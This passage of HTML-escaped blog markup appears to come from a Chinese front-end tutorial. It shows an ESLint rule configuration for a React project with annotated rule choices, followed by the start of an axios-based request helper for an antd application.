    &lt;span class=&quot;c1&quot;&gt;// 组件必须有 shouldComponentUpdate&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 没必要限制&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/require-optimization&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// render 方法中必须有返回值&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/require-render-return&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @fixable 组件内没有 children 时，必须使用自闭和写法&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 没必要限制&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/self-closing-comp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @fixable 组件内方法必须按照一定规则排序&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/sort-comp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// propTypes 的熟悉必须按照字母排序&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 没必要限制&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/sort-prop-types&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// style 属性的取值必须是 object&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/style-prop-object&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// HTML 中的自闭和标签禁止有 children&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/void-dom-elements-no-children&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @fixable 布尔值的属性必须显式的写 someprop={true}&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 没必要限制&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/jsx-boolean-value&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @fixable 自闭和标签的反尖括号必须与尖括号的那一行对齐&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/jsx-closing-bracket-location&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
      &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;nonEmpty&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;selfClosing&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;line-aligned&quot;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @fixable 结束标签必须与开始标签的那一行对齐&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 已经在 jsx-indent 中限制了&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/jsx-closing-tag-location&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'generator-star-spacing'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'consistent-return'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'no-useless-concat'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 'react/forbid-prop-types': [0],&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 'react/jsx-filename-extension': [1, { extensions: ['.js'] }],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'global-require'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 'import/prefer-default-export': [0],&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 'react/jsx-no-bind': [0],&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 'react/prop-types': [0],&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 'react/prefer-stateless-function': [0],&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 'react/jsx-wrap-multilines': [&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//   'error',&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//   {&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//     declaration: 'parens-new-line',&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//     assignment: 'parens-new-line',&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//     return: 'parens-new-line',&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//     arrow: 'parens-new-line',&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//     condition: 'parens-new-line',&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//     logical: 'parens-new-line',&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//     prop: 'ignore',&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//   },&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// ],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'no-else-return'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'no-restricted-syntax'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'import/no-extraneous-dependencies'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'no-use-before-define'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'jsx-a11y/no-static-element-interactions'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'jsx-a11y/no-noninteractive-element-interactions'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'jsx-a11y/click-events-have-key-events'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'jsx-a11y/anchor-is-valid'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'no-nested-ternary'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'prefer-template'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'no-unused-vars'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'no-param-reassign'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'react/sort-comp'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'import/no-duplicates'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'no-unneeded-ternary'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'arrow-body-style'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'spaced-comment'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'import/extensions'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'no-bitwise'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'no-cond-assign'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'import/no-unresolved'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'import/no-useless-concat'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'comma-dangle'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
      &lt;span class=&quot;s1&quot;&gt;'error'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;arrays&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'always-multiline'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;objects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'always-multiline'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;imports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'always-multiline'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;exports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'always-multiline'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;functions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ignore'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'object-curly-newline'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'function-paren-newline'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'no-restricted-globals'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'require-yield'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;parserOptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;ecmaFeatures&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;experimentalObjectRestSpread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;polyfills&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'fetch'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'promises'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;修改默认的 &lt;code class=&quot;highlighter-rouge&quot;&gt;request.js &amp;gt; request2.js&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;npm i axios --save -dd &lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;kr&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;axios&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'axios'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kr&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;notification&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'antd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;checkStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kr&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;success&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// get response successfully&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;kr&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;success&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/**
 * Requests a URL, returning a promise.
 *
 * @param  {string} url       The URL we want to request
 * @param  {object} [options] The options we want to pass to &quot;axios&quot;
 * @return {object}           An object containing either &quot;data&quot; or &quot;err&quot;
 */&lt;/span&gt;
&lt;span class=&quot;kr&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;default&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kr&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;defaultOptions&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;credentials&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'include'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
  &lt;span class=&quot;kr&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;newOptions&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;defaultOptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;options&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newOptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'POST'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;newOptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'PUT'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;newOptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'DELETE'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
